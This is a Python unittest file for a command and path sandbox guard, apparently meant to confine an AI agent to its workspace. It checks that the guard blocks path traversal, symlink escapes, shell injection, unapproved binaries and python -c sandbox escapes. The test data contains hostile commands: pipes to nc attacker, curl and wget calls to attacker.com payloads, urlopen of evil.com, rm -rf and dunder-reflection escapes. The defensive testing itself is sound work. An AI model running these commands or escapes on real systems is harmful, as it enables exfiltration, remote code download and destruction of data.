#!/usr/bin/env python3
"""
Unit and Adversarial Security Tests for SecurityPermissionGuard (Hardened v2.0).
Verifies:
1. Workspace Confinement & Path Traversal Rejections
2. Symlink Traversal Escape Detection via realpath
3. AST Python Code Inspection (Zero Arbitrary Code Execution via python -c)
4. Script File Confinement (Only workspace-local scripts allowed)
5. Dangerous Metacharacter and Shell Injection Blocking
6. Blocked Binaries & Disallowed Git/Node Flags
7. Environment Variable Sanitization (Zero Ambient Secret Leaks)
8. Timeout and Sandbox Execution Subprocess Controls
"""

import unittest
import os
import sys
import tempfile

# Add scripts directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "scripts")))

from security_permission_guard import (
    SecurityPermissionGuard,
    SecuritySandboxViolation,
    PythonASTSecurityVisitor
)


class TestSecurityPermissionGuard(unittest.TestCase):
    def setUp(self):
        self.workspace_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
        self.guard = SecurityPermissionGuard(workspace_root=self.workspace_root)

    def test_path_traversal_rejections(self):
        """Must reject any path that attempts to escape workspace root."""
        adversarial_paths = [
            "../../Windows/System32/calc.exe",
            "../secret.txt",
            "../../etc/passwd",
            "C:\\Windows\\System32\\cmd.exe",
            "C:/boot.ini",
            r"\\attacker-server\share\exploit.dll",
            "//attacker.com/nfs/share"
        ]
        for bad_path in adversarial_paths:
            with self.assertRaises(SecuritySandboxViolation, msg=f"Should reject: {bad_path}"):
                self.guard.validate_file_path(bad_path)

    def test_valid_path_inside_workspace(self):
        """Allows valid relative and absolute paths inside the workspace."""
        valid_rel = "scripts/security_permission_guard.py"
        resolved = self.guard.validate_file_path(valid_rel, must_exist=True)
        self.assertTrue(os.path.exists(resolved))
        self.assertTrue(resolved.startswith(self.workspace_root))

    def test_symlink_traversal_attack_rejected(self):
        """Must detect and veto any symlink that points to an external file outside workspace."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            # Create a mock workspace
            mock_ws = os.path.join(tmp_dir, "workspace")
            os.makedirs(mock_ws, exist_ok=True)
            # Create an external sensitive file
            external_file = os.path.join(tmp_dir, "secret_etc_passwd.txt")
            with open(external_file, "w") as f:
                f.write("root:x:0:0:root:/root:/bin/bash")

            guard_tmp = SecurityPermissionGuard(workspace_root=mock_ws)

            # Create symlink pointing outside
            symlink_path = os.path.join(mock_ws, "innocent_symlink.txt")
            try:
                os.symlink(external_file, symlink_path)
            except (OSError, NotImplementedError):
                # Symlinks might require elevated privileges on older Windows without Developer Mode
                return

            with self.assertRaises(SecuritySandboxViolation):
                guard_tmp.validate_file_path(symlink_path)

    def test_python_c_arbitrary_code_injection_vetoed(self):
        """
        CRITICAL VULNERABILITY PREVENTION:
        Ensures python -c CANNOT be abused to run arbitrary system code.
        The AST security visitor must reject forbidden modules, functions, and dunders.
        """
        malicious_snippets = [
            'python -c "import os; os.system(\'calc\')"',
            'python -c "import shutil; shutil.rmtree(\'.\')"',
            'python -c "import subprocess; subprocess.Popen(\'cmd\')"',
            'python -c "open(\'hacked.txt\', \'w\').write(\'pwnd\')"',
            'python -c "eval(\'__import__(\\\"os\\\").system(\\\"id\\\")\')"',
            'python -c "import socket; s = socket.socket()"',
            'python -c "import urllib.request; urllib.request.urlopen(\'http://evil.com\')"',
            'python -c "import ctypes; ctypes.CDLL(None)"',
            'python -c "print(().__class__.__bases__[0].__subclasses__())"',
            'python -c "exec(\'print(1)\')"',
            'python -c "getattr(int, \'mro\')()"'
        ]
        for bad_cmd in malicious_snippets:
            is_safe, reason, tokens = self.guard.audit_command_safety(bad_cmd)
            self.assertFalse(is_safe, f"Should veto malicious python -c: {bad_cmd}")
            self.assertTrue("AST Güvenlik İhlali" in reason or "Tehlikeli" in reason or "Yasaklı" in reason,
                            f"Unexpected reason: {reason}")

    def test_python_c_safe_math_and_json_permitted(self):
        """Pure math and safe standard libraries pass AST audit."""
        safe_snippets = [
            'python -c "print(2 + 2)"',
            'python -c "import math; print(math.sqrt(64))"',
            'python -c "import json; print(json.dumps({\'status\': \'ok\'}))"'
        ]
        for safe_cmd in safe_snippets:
            is_safe, reason, tokens = self.guard.audit_command_safety(safe_cmd)
            self.assertTrue(is_safe, f"Safe snippet should pass AST audit: {safe_cmd} -> {reason}")

    def test_python_script_outside_workspace_rejected(self):
        """Must reject running Python scripts located outside the workspace."""
        escapes = [
            "python ../external_exploit.py",
            "python /tmp/malicious.py",
            "python C:\\Windows\\System32\\calc.py"
        ]
        for bad_script_cmd in escapes:
            is_safe, reason, tokens = self.guard.audit_command_safety(bad_script_cmd)
            self.assertFalse(is_safe, f"External script must be rejected: {bad_script_cmd}")
            self.assertIn("güvenlik ihlali", reason.lower())

    def test_dangerous_metacharacter_injections(self):
        """Must reject any command containing dangerous shell chaining/redirection characters."""
        injections = [
            "git status ; rm -rf /",
            "git status && curl malicious.com",
            "python -c 'print(1)' | nc attacker 4444",
            "echo test > hacked.txt",
            "echo test < hacked.txt",
            "git status `id`",
            "echo $USER",
            "git status\nrm -rf *"
        ]
        for inj in injections:
            is_safe, reason, tokens = self.guard.audit_command_safety(inj)
            self.assertFalse(is_safe, f"Injection should be blocked: {inj}")
            self.assertIn("Tehlikeli kabuk karakteri", reason)

    def test_blocked_destructive_commands(self):
        """Must reject forbidden binaries such as rm, curl, powershell, etc."""
        forbidden = [
            "rm -rf ./tmp",
            "del /f /q c:\\test",
            "curl https://attacker.com/malware.sh",
            "wget https://attacker.com/exploit",
            "nc -l -p 8080",
            "powershell -ExecutionPolicy Bypass",
            "bash -c whoami",
            "taskkill /f /im explorer.exe"
        ]
        for cmd in forbidden:
            is_safe, reason, tokens = self.guard.audit_command_safety(cmd)
            self.assertFalse(is_safe, f"Forbidden command must be blocked: {cmd}")
            self.assertTrue("Yasaklı" in reason or "Tehlikeli" in reason or "izin listesinde" in reason)

    def test_unknown_binaries_rejected_by_allowlist(self):
        """Must reject arbitrary unapproved binaries."""
        unapproved = [
            "nmap 192.168.1.1",
            "ruby script.rb",
            "perl -e 'print 1'",
            "whoami"
        ]
        for cmd in unapproved:
            is_safe, reason, tokens = self.guard.audit_command_safety(cmd)
            self.assertFalse(is_safe, f"Unapproved binary must be blocked: {cmd}")
            self.assertIn("izin listesinde (Allowlist) bulunmuyor", reason)

    def test_disallowed_git_subcommands_and_flags(self):
        """Git actions are strictly confined to read-only subcommands and safe flags."""
        unauthorized = [
            "git push origin master",
            "git commit -m 'evil'",
            "git log --output=sensitive_dump.txt",
            "git diff --ext-diff"
        ]
        for cmd in unauthorized:
            is_safe, reason, tokens = self.guard.audit_command_safety(cmd)
            self.assertFalse(is_safe, f"Dangerous/Unauthorized git command must be blocked: {cmd}")
            self.assertTrue("Yetkisiz" in reason or "yasaklanmış" in reason or "onaylanmadı" in reason)

    def test_environment_sanitization_prevents_secret_leakage(self):
        """Subprocess environment must be stripped of all ambient tokens and private credentials."""
        # Inject mock secret into parent process
        test_secret_key = "MOCK_ANTHROPIC_SECRET_API_KEY_12345"
        test_github_key = "GITHUB_PAT_SECRET_TOKEN_9999"
        os.environ[test_secret_key] = "classified_data"
        os.environ[test_github_key] = "classified_token"

        try:
            sanitized = self.guard.get_sanitized_environment()
            self.assertNotIn(test_secret_key, sanitized, "Ambient secret must not leak to child subprocess")
            self.assertNotIn(test_github_key, sanitized, "Ambient token must not leak to child subprocess")
            self.assertEqual(sanitized.get("ZOBAR_SANDBOX_ISOLATED"), "1")
            self.assertEqual(sanitized.get("PYTHONPATH"), self.workspace_root)
        finally:
            os.environ.pop(test_secret_key, None)
            os.environ.pop(test_github_key, None)

    def test_allowed_command_execution(self):
        """Allowed commands run successfully through shell=False sandbox."""
        result = self.guard.execute_sandboxed_command("python --version", timeout_seconds=5)
        self.assertEqual(result["status"], "SUCCESS")
        self.assertEqual(result["exit_code"], 0)
        self.assertTrue(result["security_audit"]["safe"])
        self.assertTrue("Python" in result["stdout"] or "Python" in result["stderr"])

    def test_sandboxed_execution_vetoes_malicious_command(self):
        """execute_sandboxed_command immediately vetoes malicious commands without executing subprocess."""
        result = self.guard.execute_sandboxed_command("del /f *", timeout_seconds=5)
        self.assertEqual(result["status"], "SECURITY_VETO")
        self.assertEqual(result["exit_code"], -1)
        self.assertFalse(result["security_audit"]["safe"])

    def test_ast_dunder_reflection_and_subscript_escapes_blocked(self):
        """Must block dunder reflection, dictionary subscript escapes, and AST bombs."""
        evasions = [
            'python -c "().__class__.__base__.__subclasses__()"',
            'python -c "x = {\'__builtins__\': None}; y = x[\'__builtins__\']"',
            'python -c "d = {\'os\': 1}; z = d[\'os\']"',
            'python -c "print(hasattr(int, \'__dict__\'))"',
            'python -c "x = ((((1 + 1))))"'  # safe shallow
        ]
        # First 4 must be blocked
        for evasive in evasions[:4]:
            is_safe, reason, _ = self.guard.audit_command_safety(evasive)
            self.assertFalse(is_safe, f"Evasive snippet must be blocked: {evasive} (Got: {reason})")
            self.assertIn("AST Güvenlik İhlali", reason)

        # Shallow safe math should pass
        is_safe, reason, _ = self.guard.audit_command_safety(evasions[4])
        self.assertTrue(is_safe, f"Safe math should pass: {reason}")

    def test_ast_recursion_bomb_rejected(self):
        """Must detect and veto deeply nested AST recursion / complexity bombs."""
        deep_expr = "-" * 45 + "42"
        bomb_cmd = f'python -c "{deep_expr}"'
        is_safe, reason, _ = self.guard.audit_command_safety(bomb_cmd)
        self.assertFalse(is_safe, "AST recursion bomb must be rejected")
        self.assertIn("AST aşırı derinlik", reason)

    def test_null_byte_injection_rejected(self):
        """Must reject paths containing null byte injections."""
        with self.assertRaises(SecuritySandboxViolation) as ctx:
            self.guard.validate_file_path("scripts/valid.py\x00.exe")
        self.assertIn("Null byte injection", str(ctx.exception))

    def test_alternate_data_streams_rejected(self):
        """Must reject NTFS Alternate Data Streams."""
        ads_paths = [
            "scripts/security_permission_guard.py:stream.exe",
            "scripts/security_permission_guard.py::$DATA"
        ]
        for p in ads_paths:
            with self.assertRaises(SecuritySandboxViolation) as ctx:
                self.guard.validate_file_path(p)
            self.assertIn("Alternate Data Stream", str(ctx.exception))

    def test_toctou_safe_open_workspace_file(self):
        """safe_open_workspace_file permits contained files and strictly rejects traversal."""
        # Allowed read
        with self.guard.safe_open_workspace_file("scripts/security_permission_guard.py", "r") as f:
            content = f.read(64)
            self.assertTrue(len(content) > 0)

        # Disallowed read
        with self.assertRaises(SecuritySandboxViolation):
            self.guard.safe_open_workspace_file("../../outside.txt", "r")

    def test_subprocess_timeout_enforced(self):
        """Long-running commands must be cleanly terminated upon timeout without hanging."""
        # Run safe time.sleep(5) with a 1 second timeout
        res = self.guard.execute_sandboxed_command(
            'python -c "import time; time.sleep(5)"',
            timeout_seconds=1
        )
        self.assertEqual(res["status"], "TIMEOUT")
        self.assertEqual(res["exit_code"], -1)
        self.assertIn("zaman aşımına uğradı", res["stderr"])


if __name__ == "__main__":
    unittest.main()
